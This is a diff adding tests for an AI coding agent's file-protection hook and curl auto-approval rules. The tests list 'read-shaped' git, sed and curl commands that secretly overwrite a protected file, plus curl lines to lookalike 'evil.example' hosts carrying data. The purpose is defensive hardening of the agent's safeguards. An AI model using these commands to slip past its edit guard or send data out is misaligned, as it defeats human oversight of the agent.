@@ -217,3 +217,46 @@ test("settings.json auto-approves curl only to a loopback PORT, never a lookalik
   for (const cmd of ["curl http://127.0.0.1.evil.example/?d=x", "curl http://127.0.0.1@evil.example/", "curl http://localhost.evil.example/"])
     assert.ok(!allowed(cmd), `settings.json must NOT auto-approve: ${cmd}`);
 });
+
+// R4-SUPPLY-4 (2026-10-10): allow-listed "read" commands that WRITE a named file.
+// Each is auto-approved by settings.json (git checkout/restore/diff, sed -n, curl
+// to loopback), so the edit guard was the only check, and shellparse saw none.
+const READ_SHAPED_WRITES = [
+  "git checkout HEAD~5 -- js/roster.js", "git checkout -- js/roster.js", "git checkout HEAD js/roster.js",
+  "git checkout js/roster.js", "git -C js checkout -- roster.js",
+  "git restore --source=HEAD~5 js/roster.js", "git restore js/roster.js", "git restore -s HEAD~1 js/roster.js",
+  "git restore --staged --worktree js/roster.js",
+  "sed -n 'w js/roster.js' AGENTS.md", "sed -e 's/a/b/w js/roster.js' AGENTS.md", "sed -ne '1p' -e '/a/W js/roster.js' AGENTS.md",
+  "git diff --output=js/roster.js HEAD~1", "git log -p --output js/roster.js", "git show --output=js/roster.js HEAD",
+  "curl -so js/roster.js http://127.0.0.1:3456/x", "curl --output js/roster.js http://127.0.0.1:3456/x",
+  "curl -o js/roster.js http://127.0.0.1:3456/x", "curl -sSLojs/roster.js http://127.0.0.1:3456/x",
+  "curl --output-dir js -o roster.js http://127.0.0.1:3456/x",
+];
+const READ_SHAPED_READS = [
+  "git checkout main", "git checkout -b feat origin/main", "git checkout cursor/topic-1234", "git restore --staged js/roster.js",
+  "git diff", "git diff HEAD~1 --stat -- js/roster.js", "git show HEAD:js/roster.js", "git log --oneline -- js/roster.js",
+  "sed -n '1,20p' js/roster.js", "sed -n '/w x/p;$p' js/roster.js", "sed 's/w/W/g' js/roster.js", "sed -n 'l;w /dev/stdout' js/roster.js",
+  "curl http://127.0.0.1:3456/x", "curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:3456/x", "curl -H 'X: -o js/roster.js' http://127.0.0.1:3456/x",
+];
+
+test("the edit guard blocks a generated file written by git checkout/restore/--output, sed w, curl -o (R4-SUPPLY-4)", () => {
+  const repo = scratchRepo("hook-readwrite-");
+  const run = (command) => spawnSync("bash", [path.join(ROOT, ".claude/hooks/protect-files.sh")], {
+    input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: repo.dir }),
+    cwd: repo.dir, encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: repo.dir },
+  });
+  try {
+    fs.mkdirSync(path.join(repo.dir, "js"), { recursive: true });
+    fs.writeFileSync(path.join(repo.dir, "js/roster.js"), "var ApexRoster;\n");
+    assert.equal(run("cp docs/PHYSICS.md js/roster.js").status, 2, "control: a cp onto the generated file is blocked");
+    for (const cmd of READ_SHAPED_WRITES) {
+      const r = run(cmd);
+      assert.equal(r.status, 2, `must block: ${cmd} (${r.stderr})`);
+      assert.match(r.stderr, /js\/roster\.js \(via Bash: (git-|sed-w|curl)/, `the refusal names the write: ${cmd}`);
+    }
+    for (const cmd of READ_SHAPED_READS) {
+      const r = run(cmd);
+      assert.equal(r.status, 0, `a read must stay open: ${cmd} (${r.stderr})`);
+    }
+  } finally { repo.rm(); }
+});
